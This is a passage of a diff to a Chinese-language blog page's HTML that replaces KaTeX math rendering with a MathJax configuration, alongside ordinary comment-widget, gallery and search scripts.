class="title is-5">评论</h3><div class="content" id="valine-thread"></div><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="https://cdnjs.loli.net/ajax/libs/valine/1.4.14/Valine.min.js"></script><script>new Valine({
             el: '#valine-thread' ,
             appId: "Cm6SOyxcRow2ynGlFReSz3y4-gzGzoHsz",
@@ -192,10 +182,22 @@
                 }
                 $('.justified-gallery').justifiedGallery();
             }
-        });</script><!--!--><!--!--><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/KaTeX/0.11.1/katex.min.css"><script src="https://cdnjs.loli.net/ajax/libs/KaTeX/0.11.1/katex.min.js" defer></script><script src="https://cdnjs.loli.net/ajax/libs/KaTeX/0.11.1/contrib/auto-render.min.js" defer></script><script src="https://cdnjs.loli.net/ajax/libs/KaTeX/0.11.1/contrib/mhchem.js" defer></script><script>window.addEventListener("load", function() {
-            document.querySelectorAll('[role="article"] > .content').forEach(function(element) {
-                renderMathInElement(element);
-            });
-        });</script><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
+        });</script><!--!--><!--!--><script type="text/x-mathjax-config">MathJax.Hub.Config({
+            'HTML-CSS': {
+                matchFontHeight: false
+            },
+            SVG: {
+                matchFontHeight: false
+            },
+            CommonHTML: {
+                matchFontHeight: false
+            },
+            tex2jax: {
+                inlineMath: [
+                    ['$','$'],
+                    ['\\(','\\)']
+                ]
+            }
+        });</script><script src="https://cdnjs.loli.net/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" defer></script><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
             loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
         });</script></body></html>
